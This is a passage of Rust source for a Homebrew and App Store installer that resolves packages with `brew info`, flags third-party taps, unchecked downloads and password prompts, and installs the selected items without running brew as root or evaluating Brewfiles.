//! `dotdipper install apps`: an interactive, verified installer for the
//! captured Homebrew and App Store inventory.
//!
//! The previous route to a working machine was a generated bash script of
//! fifty-odd packages. It ran for half an hour, stopped at unpredictable
//! points to ask for a password because a cask happened to ship a `.pkg`,
//! and installed whatever the inventory named without saying what any of it
//! was. Someone had to sit with it.
//!
//! This module replaces that with three phases, in this order:
//!
//! 1. **Resolve.** Every entry is looked up with `brew info --json=v2`
//!    before it is offered, one call per kind rather than one per package.
//!    That tells us what each name actually is (description, homepage), and
//!    what installing it will involve: a third-party tap whose Ruby runs at
//!    install time, a download with no checksum, an installer that will ask
//!    for an administrator password, a package Homebrew has deprecated or
//!    disabled, or a name that no longer exists at all.
//! 2. **Decide.** All of the interaction happens here, up front: a
//!    filterable checklist, one review summary, one confirmation, and at most
//!    one password prompt.
//! 3. **Install.** Unattended. Failures are collected rather than fatal, and
//!    the final report says what to run to retry each one.
//!
//! The parsing, classification, selection and rendering are pure functions,
//! and every command goes through [`Host`], so the tests run against captured
//! JSON and a fake host and never call brew.
//!
//! # Security
//!
//! A Brewfile is Ruby, and `brew bundle` evaluates it. A pulled Brewfile is
//! therefore never passed to `brew bundle` here: names are extracted with a
//! regex ([`super::apps_script::parse_brewfile`]), checked by
//! [`super::apps_script::is_safe_token`], and passed to `brew install` as
//! argv after `--`. `brew` itself never runs under `sudo`.

use anyhow::{Context, Result};
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::{BTreeMap, BTreeSet};
use std::fmt::Write as _;
use std::path::{Path, PathBuf};

use super::apps_script::{self, is_safe_token, AppsInventory, Inventory, Plan};

/// Taps maintained by the Homebrew project itself. Anything else is a
/// third-party tap: a git repository of Ruby that `brew` evaluates at
/// install time with the user's privileges.
pub const OFFICIAL_TAPS: &[&str] = &["homebrew/core", "homebrew/cask"];

/// Name of the per-machine file that remembers what the user deselected.
pub const SKIP_FILE_NAME: &str = "apps-skip.toml";

// ---------------------------------------------------------------------------
// Items and flags
// ---------------------------------------------------------------------------

/// What kind of package an item is. The order is the display order.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Kind {
    Formula,
    Cask,
    AppStore,
}

impl Kind {
    /// The group heading shown in the picker and the summary.
    pub fn group(self) -> &'static str {
        match self {
            Kind::Formula => "CLI tools",
            Kind::Cask => "Apps",
            Kind::AppStore => "App Store",
        }
    }

    /// A fixed-width tag that prefixes each picker row. The picker has no
    /// group headings, so the group is part of the row, which also makes it
    /// something the filter can match ("store" narrows to App Store titles).
    fn tag(self) -> &'static str {
        match self {
            Kind::Formula => "CLI  ",
            Kind::Cask => "App  ",
            Kind::AppStore => "Store",
        }
    }

    fn brew_flag(self) -> &'static str {
        match self {
            Kind::Formula => "--formula",
            Kind::Cask => "--cask",
            Kind::AppStore => unreachable!("App Store titles are not brew packages"),
        }
    }
}

/// Something the user should know about an item before installing it.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Flag {
    /// Lives in a tap outside homebrew/core and homebrew/cask. Tapping it
    /// clones someone's repository and installing from it runs their Ruby.
    ThirdPartyTap,
    /// `brew info` does not know the name. It was renamed or removed.
    NotFound,
    /// Homebrew has deprecated it; it still installs, for now.
    Deprecated,
    /// Homebrew has disabled it; it will not install.
    Disabled,
    /// A cask with `sha256 :no_check`: the download is not verified against
    /// a checksum, so a compromised download server goes unnoticed.
    UnverifiedDownload,
    /// Installing it asks for an administrator password (a cask with a
    /// `pkg` or `installer` artifact, or `mas install` where mas requires
    /// root).
    NeedsPassword,
    /// An App Store title: needs `mas` and a signed-in App Store account.
    NeedsAppStore,
}

impl Flag {
    pub fn label(self) -> &'static str {
        match self {
            Flag::ThirdPartyTap => "third-party tap",
            Flag::NotFound => "not found",
            Flag::Deprecated => "deprecated",
            Flag::Disabled => "disabled",
            Flag::UnverifiedDownload => "unverified download",
            Flag::NeedsPassword => "needs password",
            Flag::NeedsAppStore => "App Store",
        }
    }

    /// Flags that leave an item unchecked by default. The user can still
    /// check it; this only decides what "accept the defaults" means.
    fn unchecked_by_default(self) -> bool {
        matches!(
            self,
            Flag::NotFound | Flag::Disabled | Flag::Deprecated | Flag::ThirdPartyTap
        )
    }

    /// Flags under which an install cannot succeed at all.
    fn uninstallable(self) -> bool {
        matches!(self, Flag::NotFound | Flag::Disabled)
    }
}

/// One installable entry, resolved against Homebrew or the App Store.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Item {
    pub kind: Kind,
    /// The name as the inventory spelled it (for App Store titles, the id).
    /// This is the key for `--only`, `--skip` and the skip file.
    pub name: String,
    /// What brew resolved the name to: an alias becomes its target
    /// (`python` to `python@3.14`). The install uses this.
    pub token: String,
    /// The tap the item comes from, if it is a brew package.
    pub tap: Option<String>,
    /// For App Store titles, the title recorded in the inventory.
    pub title: Option<String>,
    pub desc: Option<String>,
    pub homepage: Option<String>,
    pub flags: BTreeSet<Flag>,
    pub installed: bool,
}

impl Item {
    fn new(kind: Kind, name: &str) -> Self {
        Item {
            kind,
            name: name.to_string(),
            token: name.to_string(),
            tap: tap_of(name),
            title: None,
            desc: None,
            homepage: None,
            flags: BTreeSet::new(),
            installed: false,
        }
    }

    pub fn has(&self, flag: Flag) -> bool {
        self.flags.contains(&flag)
    }

    /// The name shown to the user.
    pub fn display_name(&self) -> String {
        match (&self.kind, &self.title) {
            (Kind::AppStore, Some(title)) => format!("{title} ({})", self.name),
            (Kind::AppStore, None) => format!("App Store id {}", self.name),
            _ => self.token.clone(),
        }
    }

    /// True when `key` names this item loosely: its inventory name, resolved
    /// token, the last segment of either, or an App Store title.
    /// Case-insensitive. Used where matching too much is harmless (`--skip`,
    /// and explaining an `--only` key that selected nothing).
    pub fn matches(&self, key: &str) -> bool {
        let key = key.trim();
        if key.is_empty() {
            return false;
        }
        let short = |s: &str| s.rsplit('/').next().unwrap_or(s).to_string();
        [
            Some(self.name.clone()),
            Some(self.token.clone()),
            Some(short(&self.name)),
            Some(short(&self.token)),
            self.title.clone(),
        ]
        .into_iter()
        .flatten()
        .any(|candidate| candidate.eq_ignore_ascii_case(key))
    }

    /// True when `key` is enough to *select* this item for installation.
    ///
    /// Stricter than [`Item::matches`]. A bare `jq` must never select
    /// `evil/tap/jq`: that would tap `evil/tap` and run its Ruby, and under
    /// `--yes` or without a terminal nobody would be asked. So an item from
    /// a third-party tap is selected only by its full name; a bare name
    /// selects only items from the official taps and App Store titles.
    pub fn selected_by(&self, key: &str) -> bool {
        let key = key.trim();
        if key.is_empty() {
            return false;
        }
        if self.has(Flag::ThirdPartyTap) {
            return key.contains('/')
                && (self.name.eq_ignore_ascii_case(key) || self.token.eq_ignore_ascii_case(key));
        }
        self.matches(key)
    }

    /// Whether the item starts checked in the picker and is chosen by `--all`.
    pub fn default_selected(&self) -> bool {
        !self.flags.iter().any(|f| f.unchecked_by_default())
    }

    /// The argv that installs it, without the program name.
    pub fn install_args(&self) -> Vec<String> {
        match self.kind {
            Kind::AppStore => vec!["install".into(), self.name.clone()],
            kind => vec![
                "install".into(),
                kind.brew_flag().into(),
                "--".into(),
                self.token.clone(),
            ],
        }
    }

    /// The command a person would type to retry it.
    pub fn retry_command(&self) -> String {
        match self.kind {
            Kind::AppStore if self.has(Flag::NeedsPassword) => {
                format!("sudo mas install {}", self.name)
            }
            Kind::AppStore => format!("mas install {}", self.name),
            _ => format!("brew {}", self.install_args().join(" ")),
        }
    }

    /// The third-party tap that must be tapped before this item installs.
    fn required_tap(&self) -> Option<&str> {
        if self.has(Flag::ThirdPartyTap) {
            self.tap.as_deref()
        } else {
            None
        }
    }
}

/// `owner/tap` from `owner/tap/name`, or nothing for a bare name.
fn tap_of(name: &str) -> Option<String> {
    let parts: Vec<&str> = name.split('/').collect();
    (parts.len() == 3).then(|| format!("{}/{}", parts[0], parts[1]))
}

/// `homebrew/core/jq` is `jq`: brew prints official items without their tap,
/// so the two spellings must compare equal. Third-party names keep theirs.
fn official_name(name: &str) -> String {
    for tap in OFFICIAL_TAPS {
        if let Some(rest) = name
            .get(..tap.len() + 1)
            .filter(|p| p.eq_ignore_ascii_case(&format!("{tap}/")))
            .and_then(|_| name.get(tap.len() + 1..))
        {
            return rest.to_string();
        }
    }
    name.to_string()
}

fn is_third_party(tap: &str) -> bool {
    !OFFICIAL_TAPS.iter().any(|t| t.eq_ignore_ascii_case(tap))
}

/// The registrable-looking part of a homepage: `https://www.mozilla.org/x`
/// becomes `mozilla.org`. Enough to recognise a vendor at a glance.
pub fn homepage_domain(url: &str) -> Option<String> {
    let rest = url.split_once("://").map(|(_, r)| r).unwrap_or(url);
    let host = rest.split(['/', '?', '#']).next()?.split('@').next_back()?;
    let host = host.split(':').next()?.trim_start_matches("www.");
    (!host.is_empty()).then(|| host.to_ascii_lowercase())
}

// ---------------------------------------------------------------------------
// brew info JSON
// ---------------------------------------------------------------------------

/// The subset of `brew info --json=v2` this module reads. Everything else
/// in that (large) document is ignored.
#[derive(Debug, Default, Deserialize)]
pub struct BrewInfo {
    #[serde(default)]
    pub formulae: Vec<FormulaInfo>,
    #[serde(default)]
    pub casks: Vec<CaskInfo>,
}

#[derive(Debug, Clone, Deserialize)]
pub struct FormulaInfo {
    pub name: String,
    pub full_name: String,
    /// Other names brew accepts for it (`python` for `python@3.14`).
    #[serde(default)]
    pub aliases: Vec<String>,
    /// Names it had before a rename.
    #[serde(default)]
    pub oldnames: Vec<String>,
    #[serde(default)]
    pub tap: Option<String>,
    #[serde(default)]
    pub desc: Option<String>,
    #[serde(default)]
    pub homepage: Option<String>,
    #[serde(default)]
    pub deprecated: bool,
    #[serde(default)]
    pub disabled: bool,
}

#[derive(Debug, Clone, Deserialize)]
pub struct CaskInfo {
    pub token: String,
    pub full_token: String,
    /// Tokens it had before a rename.
    #[serde(default)]
    pub old_tokens: Vec<String>,
    #[serde(default)]
    pub tap: Option<String>,
    #[serde(default)]
    pub desc: Option<String>,
    #[serde(default)]
    pub homepage: Option<String>,
    /// A hex digest, or the literal `"no_check"`.
    #[serde(default)]
    pub sha256: Option<String>,
    #[serde(default)]
    pub deprecated: bool,
    #[serde(default)]
    pub disabled: bool,
    /// Each artifact is a one-key object (`{"app": [...]}`, `{"pkg": [...]}`).
    /// Only the keys matter here.
    #[serde(default)]
    pub artifacts: Vec<serde_json::Value>,
}

impl FormulaInfo {
    /// Whether brew would have resolved `query` to this formula.
    pub fn answers(&self, query: &str) -> bool {
        let q = official_name(query);
        [&self.name, &self.full_name]
            .into_iter()
            .chain(&self.aliases)
            .chain(&self.oldnames)
            .any(|n| official_name(n).eq_ignore_ascii_case(&q))
    }
}

impl CaskInfo {
    /// Whether brew would have resolved `query` to this cask.
    pub fn answers(&self, query: &str) -> bool {
        let q = official_name(query);
        [&self.token, &self.full_token]
            .into_iter()
            .chain(&self.old_tokens)
            .any(|n| official_name(n).eq_ignore_ascii_case(&q))
    }

    /// A `pkg` or `installer` artifact runs Apple's installer, which asks for
    /// an administrator password; an `app` artifact is a copy and does not.
    pub fn needs_password(&self) -> bool {
        self.artifacts.iter().any(|a| {
            a.as_object()
                .is_some_and(|o| o.contains_key("pkg") || o.contains_key("installer"))
        })
    }

    pub fn unverified_download(&self) -> bool {
        self.sha256.as_deref() == Some("no_check")
    }
}

pub fn parse_brew_info(json: &str) -> Result<BrewInfo> {
    serde_json::from_str(json).context("Failed to parse `brew info --json=v2` output")
}

/// The name brew refused, from the error it prints when a batch contains an
/// unknown name. brew reports only the first unknown name and prints no
/// JSON at all, so the caller drops it and asks again.
pub fn missing_name_in(stderr: &str) -> Option<String> {
    static RE: std::sync::OnceLock<Regex> = std::sync::OnceLock::new();
    let re = RE.get_or_init(|| {
        Regex::new(concat!(
            r#"No available formula(?: or cask)? with the name "([^"]+)""#,
            r#"|Cask '([^']+)' is unavailable"#,
            r#"|No available cask with the name "([^"]+)""#,
        ))
        .expect("valid missing-name regex")
    });
    let caps = re.captures(stderr)?;
    (1..=3)
        .find_map(|i| caps.get(i))
        .map(|m| m.as_str().to_string())
}

/// The name in brew's refusal to read a formula or cask from a tap the user
/// has not trusted: ``Run `brew trust --formula owner/tap/name` ...``.
/// Trust is recorded per user, so the tap can be present on the machine and
/// still be refused, which is exactly the state of a fresh account on a Mac
/// whose Homebrew someone else set up.
pub fn untrusted_name_in(stderr: &str) -> Option<String> {
    static RE: std::sync::OnceLock<Regex> = std::sync::OnceLock::new();
    let re = RE.get_or_init(|| {
        Regex::new(r"brew trust (?:--formula |--cask )?([A-Za-z0-9@._+-]+(?:/[A-Za-z0-9@._+-]+)*)")
            .expect("valid untrusted-name regex")
    });
    re.captures(stderr).map(|c| c[1].to_string())
}

/// Builds an item from a resolved formula.
pub fn classify_formula(name: &str, info: &FormulaInfo) -> Item {
    let mut item = Item::new(Kind::Formula, name);
    item.token = info.full_name.clone();
    item.tap = info.tap.clone().or_else(|| tap_of(&info.full_name));
    item.desc = info.desc.clone();
    item.homepage = info.homepage.clone();
    if item.tap.as_deref().is_some_and(is_third_party) {
        item.flags.insert(Flag::ThirdPartyTap);
    }
    if info.deprecated {
        item.flags.insert(Flag::Deprecated);
    }
    if info.disabled {
        item.flags.insert(Flag::Disabled);
    }
    item
}

/// Builds an item from a resolved cask.
pub fn classify_cask(name: &str, info: &CaskInfo) -> Item {
    let mut item = Item::new(Kind::Cask, name);
    item.token = info.full_token.clone();
    item.tap = info.tap.clone().or_else(|| tap_of(&info.full_token));
    item.desc = info.desc.clone();
    item.homepage = info.homepage.clone();
    if item.tap.as_deref().is_some_and(is_third_party) {
        item.flags.insert(Flag::ThirdPartyTap);
    }
    if info.deprecated {
        item.flags.insert(Flag::Deprecated);
    }
    if info.disabled {
        item.flags.insert(Flag::Disabled);
    }
    if info.unverified_download() {
        item.flags.insert(Flag::UnverifiedDownload);
    }
    if info.needs_password() {
        item.flags.insert(Flag::NeedsPassword);
    }
    item
}

/// An entry brew could not resolve. A fully qualified name keeps its tap,
/// so a renamed package in a third-party tap is still flagged as one.
pub fn classify_not_found(kind: Kind, name: &str) -> Item {
    let mut item = Item::new(kind, name);
    item.flags.insert(Flag::NotFound);
    if item.tap.as_deref().is_some_and(is_third_party) {
        item.flags.insert(Flag::ThirdPartyTap);
    }
    item
}

/// An entry under a third-party tap that is not tapped on this machine.
///
/// Deliberately not looked up: resolving it would mean tapping it, which
/// clones the repository and evaluates its Ruby before the user has agreed
/// to anything. It is offered by name, unchecked, and tapped only if chosen.
pub fn classify_untapped(kind: Kind, name: &str) -> Item {
    let mut item = Item::new(kind, name);
    item.flags.insert(Flag::ThirdPartyTap);
    item
}

pub fn classify_app_store(id: u64, title: Option<&str>, needs_root: bool) -> Item {
    let mut item = Item::new(Kind::AppStore, &id.to_string());
    item.tap = None;
    item.title = title.map(sanitize_display);
    item.flags.insert(Flag::NeedsAppStore);
    if needs_root {
        item.flags.insert(Flag::NeedsPassword);
    }
    item
}

/// Drops control characters from text that came from a pulled file and is
/// about to be printed to a terminal.
fn sanitize_display(text: &str) -> String {
    text.chars().filter(|c| !c.is_control()).collect()
}

// ---------------------------------------------------------------------------
// The host: every command this module runs
// ---------------------------------------------------------------------------

/// The result of running one command.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct CmdOutput {
    pub success: bool,
    pub stdout: String,
    pub stderr: String,
}

impl CmdOutput {
    /// The last non-empty line of stderr, which is where brew puts the
    /// reason. Used in the failure report.
    pub fn reason(&self) -> String {
        self.stderr
            .lines()
            .rev()
            .map(str::trim)
            .find(|l| !l.is_empty())
            .unwrap_or("exited with an error")
            .to_string()
    }
}

/// Everything this module runs, behind one seam so it can be faked.
///
/// There is no method that runs brew as root, on purpose: Homebrew refuses
/// it, and a root-owned file in the prefix breaks every later install.
pub trait Host {
    /// Runs `brew` with `args` as the current user.
    fn brew(&mut self, args: &[String]) -> Result<CmdOutput>;
    /// Runs `mas` with `args`; with `as_root`, as `sudo -n mas ...`, which
    /// uses the cached authorization and never prompts mid-run.
    fn mas(&mut self, args: &[String], as_root: bool) -> Result<CmdOutput>;
    /// Whether `mas` is on this machine.
    fn has_mas(&mut self) -> bool;
    /// Called before each item that needs the administrator password:
    /// confirms the approval given at the start is still valid, and asks
    /// again, in plain view, if it lapsed. False when there is no approval
    /// and nobody to ask, so the item is skipped rather than left waiting
    /// on a prompt nobody can see.
    fn ensure_admin(&mut self) -> bool {
        true
    }
}

fn args(list: &[&str]) -> Vec<String> {
    list.iter().map(|s| s.to_string()).collect()
}

/// Whether the user is signed in to the App Store, as far as `mas` can say.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AppStoreAccount {
    SignedIn,
    SignedOut,
    /// `mas` is absent, or too new to report it: mas 7 removed `mas account`.
    Unknown,
    /// No App Store titles are involved, so nobody asked.
    NotNeeded,
}

/// Asks `mas account`. The output (an Apple ID, which is personal data) is
/// never printed; only whether it succeeded matters.
pub fn app_store_account(host: &mut dyn Host) -> AppStoreAccount {
    if !host.has_mas() {
        return AppStoreAccount::Unknown;
    }
    match host.mas(&args(&["account"]), false) {
        Ok(out) if out.success && !out.stdout.trim().is_empty() => AppStoreAccount::SignedIn,
        Ok(out)
            if format!("{}{}", out.stdout, out.stderr)
                .to_lowercase()
                .contains("not signed in") =>
        {
            AppStoreAccount::SignedOut
        }
        _ => AppStoreAccount::Unknown,
    }
}

/// mas 2 and later install as root (`mas help install` says "Requires root
/// privileges"). Asking the help text is local and instant, and it does not
/// depend on knowing which release made the change.
pub fn mas_needs_root(host: &mut dyn Host) -> bool {
    host.has_mas()
        && host
            .mas(&args(&["help", "install"]), false)
            .map(|o| (o.stdout + &o.stderr).contains("Requires root"))
            .unwrap_or(false)
}

// ---------------------------------------------------------------------------
// Resolution
// ---------------------------------------------------------------------------

/// The inventory as this module needs it: the validated plan plus App Store
/// titles for display.
#[derive(Debug, Default, Clone)]
pub struct Wanted {
    pub plan: Plan,
    pub mas_titles: BTreeMap<u64, String>,
}

/// Reads the Brewfile and apps manifest from a store. The Brewfile is only
/// ever read as text and parsed with a regex; it is never evaluated.
pub fn load_wanted(store: &Path) -> Result<Option<Wanted>> {
    let brewfile = std::fs::read_to_string(store.join("Brewfile")).ok();
    let manifest = match std::fs::read_to_string(store.join("apps_manifest.toml")) {
        Ok(text) => Some(AppsInventory::parse(&text)?),
        Err(_) => None,
    };
    if brewfile.is_none() && manifest.is_none() {
        // A public mirror withholds both and ships its generated script.
        let script = store.join(INSTALL_SCRIPT);
        return match std::fs::read_to_string(&script) {
            Ok(text) => Ok(wanted_from_install_script(&text)),
            Err(_) => Ok(None),
        };
    }
    Ok(Some(wanted_from(brewfile.as_deref(), manifest.as_ref())))
}

pub fn wanted_from(brewfile: Option<&str>, manifest: Option<&AppsInventory>) -> Wanted {
    let plan = apps_script::plan(
        &Inventory {
            brewfile,
            apps: manifest,
        },
        &[],
    );
    let mut mas_titles = BTreeMap::new();
    if let Some(text) = brewfile {
        let re = Regex::new(r#"(?m)^\s*mas\s+["']([^"']+)["']\s*,\s*id:\s*(\d+)"#)
            .expect("valid mas title regex");
        for caps in re.captures_iter(text) {
            if let Ok(id) = caps[2].parse::<u64>() {
                mas_titles.insert(id, caps[1].to_string());
            }
        }
    }
    if let Some(m) = manifest {
        for entry in &m.mas {
            mas_titles.insert(entry.id, entry.name.clone());
        }
    }
    Wanted { plan, mas_titles }
}

/// The script a public mirror ships instead of its Brewfile.
pub const INSTALL_SCRIPT: &str = "install-apps.sh";

/// Reads the package lists of a generated `install-apps.sh` as data. The
/// script is never run: only its `FORMULAE`, `CASKS` and `MAS_IDS` arrays
/// are read, one single-quoted word per line, and every word must still be
/// a plain Homebrew name or a numeric id. Anything else in the file,
/// including its taps, is ignored. `None` when it has none of the arrays.
pub fn wanted_from_install_script(text: &str) -> Option<Wanted> {
    const LISTS: [&str; 3] = ["FORMULAE", "CASKS", "MAS_IDS"];
    let mut lists: BTreeMap<&str, Vec<String>> = BTreeMap::new();
    let mut current: Option<&str> = None;
    for line in text.lines() {
        let line = line.trim();
        match current {
            None => {
                current = LISTS
                    .into_iter()
                    .find(|name| line.strip_prefix(name) == Some("=("));
                if let Some(name) = current {
                    lists.entry(name).or_default();
                }
            }
            Some(_) if line == ")" => current = None,
            Some(name) => {
                if let Some(word) = line.strip_prefix('\'').and_then(|w| w.strip_suffix('\'')) {
                    lists.entry(name).or_default().push(word.to_string());
                }
            }
        }
    }
    if lists.is_empty() {
        return None;
    }

    let mut brewfile = String::new();
    let mut rejected = Vec::new();
    for (name, kind) in [("FORMULAE", "brew"), ("CASKS", "cask")] {
        for word in lists.get(name).into_iter().flatten() {
            if apps_script::is_safe_token(word) {
                let _ = writeln!(brewfile, "{kind} \"{word}\"");
            } else {
                rejected.push(word.clone());
            }
        }
    }
    let mut wanted = wanted_from(Some(&brewfile), None);
    for word in lists.get("MAS_IDS").into_iter().flatten() {
        match word.parse::<u64>() {
            Ok(id) => wanted.plan.mas.push(id),
            Err(_) => rejected.push(word.clone()),
        }
    }
    wanted.plan.mas.sort_unstable();
    wanted.plan.mas.dedup();
    wanted.plan.rejected.extend(rejected);
    Some(wanted)
}

/// Reads an inventory from one file: a Brewfile, or a generated
/// `install-apps.sh`, told apart by content. Either way, it is only read.
pub fn load_wanted_file(path: &Path) -> Result<Wanted> {
    let text = std::fs::read_to_string(path)
        .with_context(|| format!("Could not read {}", path.display()))?;
    if let Some(wanted) = wanted_from_install_script(&text) {
        return Ok(wanted);
    }
    let wanted = wanted_from(Some(&text), None);
    let plan = &wanted.plan;
    if plan.formulae.is_empty() && plan.casks.is_empty() && plan.mas.is_empty() {
        anyhow::bail!(
            "{} lists no packages: expected a Brewfile or a dotdipper install-apps.sh",
            path.display()
        );
    }
    Ok(wanted)
}

/// What resolution learned about the machine, beyond the items themselves.
#[derive(Debug, Clone)]
pub struct Resolution {
    pub items: Vec<Item>,
    /// Taps already present, so installing does not re-tap them.
    pub tapped: BTreeSet<String>,
    pub account: AppStoreAccount,
    /// Inventory entries refused as unsafe names. Reported, never run.
    pub rejected: Vec<String>,
}

/// Looks every entry up and marks what is already installed.
pub fn resolve(wanted: &Wanted, host: &mut dyn Host) -> Result<Resolution> {
    let plan = &wanted.plan;
    let tapped: BTreeSet<String> = brew_lines(host, &["tap"])?
        .into_iter()
        .map(|t| t.to_ascii_lowercase())
        .collect();

    let mut items = Vec::new();
    for (kind, names) in [(Kind::Formula, &plan.formulae), (Kind::Cask, &plan.casks)] {
        let installed: BTreeSet<String> =
            brew_lines(host, &["list", kind.brew_flag(), "--full-name"])?
                .iter()
                .map(|n| official_name(n).to_ascii_lowercase())
                .collect();
        let mut resolved = resolve_kind(kind, names, &tapped, host)?;
        for item in &mut resolved {
            item.installed = is_installed(item, &installed);
        }
        items.extend(resolved);
    }

    let mut account = AppStoreAccount::NotNeeded;
    if !plan.mas.is_empty() {
        let needs_root = mas_needs_root(host);
        let installed: BTreeSet<u64> = if host.has_mas() {
            host.mas(&args(&["list"]), false)
                .map(|o| parse_mas_ids(&o.stdout))
                .unwrap_or_default()
        } else {
            BTreeSet::new()
        };
        for id in &plan.mas {
            let mut item = classify_app_store(
                *id,
                wanted.mas_titles.get(id).map(String::as_str),
                needs_root,
            );
            item.installed = installed.contains(id);
            items.push(item);
        }
        account = app_store_account(host);
    }

    Ok(Resolution {
        items,
        tapped,
        account,
        rejected: plan.rejected.clone(),
    })
}

/// Whether `item` is in `installed` (`brew list --full-name`, lowercased,
/// official tap prefixes removed). Full names only: `x/y/jq` being
/// installed says nothing about `jq` from homebrew/core.
pub fn is_installed(item: &Item, installed: &BTreeSet<String>) -> bool {
    [&item.token, &item.name]
        .into_iter()
        .any(|n| installed.contains(&official_name(n).to_ascii_lowercase()))
}

fn brew_lines(host: &mut dyn Host, list: &[&str]) -> Result<Vec<String>> {
    let out = host.brew(&args(list))?;
    if !out.success {
        anyhow::bail!("`brew {}` failed: {}", list.join(" "), out.reason());
    }
    Ok(out
        .stdout
        .split_whitespace()
        .map(|s| s.to_string())
        .collect())
}

/// The ids in `mas list` output (`  937984704  Amphetamine  (5.3.2)`).
pub fn parse_mas_ids(output: &str) -> BTreeSet<u64> {
    output
        .lines()
        .filter_map(|l| l.split_whitespace().next()?.parse().ok())
        .collect()
}

/// Resolves one kind with a single `brew info` call.
///
/// brew rejects a whole batch over one unknown name, names only the first,
/// and prints no JSON. Each failure therefore drops that name and asks
/// again: one call when everything exists, one more per missing name.
fn resolve_kind(
    kind: Kind,
    names: &[String],
    tapped: &BTreeSet<String>,
    host: &mut dyn Host,
) -> Result<Vec<Item>> {
    let mut by_name: BTreeMap<String, Item> = BTreeMap::new();
    let mut queue: Vec<String> = Vec::new();
    for name in names {
        match tap_of(name) {
            Some(tap) if is_third_party(&tap) && !tapped.contains(&tap.to_ascii_lowercase()) => {
                by_name.insert(name.clone(), classify_untapped(kind, name));
            }
            _ => queue.push(name.clone()),
        }
    }

    while !queue.is_empty() {
        let mut argv = args(&["info", "--json=v2", kind.brew_flag(), "--"]);
        argv.extend(queue.iter().cloned());
        let out = host.brew(&argv)?;
        if !out.success {
            // An untrusted tap is not an unknown package: it is a third-party
            // tap, offered unselected like one that is not tapped at all.
            let untrusted = untrusted_name_in(&out.stderr)
                .and_then(|u| queue.iter().position(|q| q.eq_ignore_ascii_case(&u)));
            if let Some(index) = untrusted {
                let name = queue.remove(index);
                by_name.insert(name.clone(), classify_untapped(kind, &name));
                continue;
            }
            let missing = missing_name_in(&out.stderr)
                .and_then(|m| queue.iter().position(|q| q.eq_ignore_ascii_case(&m)));
            let Some(index) = missing else {
                anyhow::bail!(
                    "`brew info` failed and did not say which name it rejected: {}",
                    out.reason()
                );
            };
            let name = queue.remove(index);
            by_name.insert(name.clone(), classify_not_found(kind, &name));
            continue;
        }

        let info = parse_brew_info(&out.stdout)?;
        // Pair answers with questions by name, never by position. brew
        // keeps argument order, but it also drops duplicates (`python` and
        // `python3` come back as one `python@3.14`) and may swap in the
        // installed formula, so position is not a contract. Aliases and old
        // names are in the JSON, which is what makes name pairing complete.
        for name in &queue {
            let item = match kind {
                Kind::Formula => info
                    .formulae
                    .iter()
                    .find(|f| f.answers(name))
                    .map(|f| classify_formula(name, f)),
                _ => info
                    .casks
                    .iter()
                    .find(|c| c.answers(name))
                    .map(|c| classify_cask(name, c)),
            }
            .unwrap_or_else(|| classify_not_found(kind, name));
            by_name.insert(name.clone(), item);
        }
        break;
    }

    Ok(names.iter().filter_map(|n| by_name.remove(n)).collect())
}

// ---------------------------------------------------------------------------
// Selection
// ---------------------------------------------------------------------------

/// Why an item is not being installed.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SkipReason {
    /// Named by `--skip`.
    Flag,
    /// Deselected on an earlier run on this machine.
    Remembered,
    /// Not named by `--only`.
    NotOnly,
    /// Left unchecked in the picker, or unchecked by default.
    Deselected,
    /// The App Store is not signed in.
    SignedOut,
    /// It cannot install: not found, or disabled.
    Uninstallable,
    /// It needs a password and there is no terminal to type one into.
    NoTerminalForPassword,
    /// An earlier step it depends on failed.
    Dependency(String),
}

impl SkipReason {
    pub fn describe(&self) -> String {
        match self {
            SkipReason::Flag => "--skip".into(),
            SkipReason::Remembered => {
                "deselected on an earlier run (--reselect to offer it)".into()
            }
            SkipReason::NotOnly => "not named by --only".into(),
            SkipReason::Deselected => "not selected".into(),
            SkipReason::SignedOut => "not signed in to the App Store".into(),
            SkipReason::Uninstallable => "cannot be installed".into(),
            SkipReason::NoTerminalForPassword => {
                "needs an administrator password and there is no terminal".into()
            }
            SkipReason::Dependency(what) => what.clone(),
        }
    }
}

/// The per-run filters, from the command line and the skip file.
#[derive(Debug, Clone, Default)]
pub struct Filters {
    pub only: Vec<String>,
    pub skip: Vec<String>,
    pub remembered: BTreeSet<String>,
    /// `--reselect`: ignore `remembered`.
    pub reselect: bool,
}

/// The state of the run before the picker: what is already there, what is
/// filtered out, and what remains to offer.
#[derive(Debug, Clone, Default)]
pub struct Triage {
    pub present: Vec<Item>,
    pub skipped: Vec<(Item, SkipReason)>,
    /// Items still on the table, in display order.
    pub offered: Vec<Item>,
    /// `--only` names that matched nothing in the inventory.
    pub unknown_only: Vec<String>,
    /// `--only` names that would match a third-party item only by its short
    /// name, paired with the full name that selects it.
    pub needs_full_name: Vec<(String, String)>,
}

/// Applies `--only`, `--skip` and the skip file. Installed items are never
/// offered. With `--only`, the named items are chosen outright, and the
/// skip file does not apply to them: naming an item is a newer decision
/// than having once deselected it.
pub fn triage(items: Vec<Item>, filters: &Filters) -> Triage {
    let mut t = Triage::default();
    let named = |item: &Item, keys: &[String]| keys.iter().any(|k| item.matches(k));

    for key in &filters.only {
        if items.iter().any(|i| i.selected_by(key)) {
            continue;
        }
        match items.iter().find(|i| i.matches(key)) {
            Some(item) => t.needs_full_name.push((key.clone(), item.name.clone())),
            None => t.unknown_only.push(key.clone()),
        }
    }

    let mut items = items;
    items.sort_by_key(|i| (i.kind, i.display_name()));
    for item in items {
        if item.installed {
            t.present.push(item);
        } else if named(&item, &filters.skip) {
            t.skipped.push((item, SkipReason::Flag));
        } else if !filters.only.is_empty() {
            if filters.only.iter().any(|k| item.selected_by(k)) {
                t.offered.push(item);
            } else {
                t.skipped.push((item, SkipReason::NotOnly));
            }
        } else if !filters.reselect && filters.remembered.contains(&item.name) {
            t.skipped.push((item, SkipReason::Remembered));
        } else {
            t.offered.push(item);
        }
    }
    t
}

/// Indices into `offered` that start checked.
pub fn default_selection(offered: &[Item]) -> Vec<usize> {
    offered
        .iter()
        .enumerate()
        .filter(|(_, i)| i.default_selected())
        .map(|(n, _)| n)
        .collect()
}

/// Splits `offered` by the chosen indices. Chosen items that cannot install
/// (not found, disabled) are moved to `skipped` rather than attempted: an
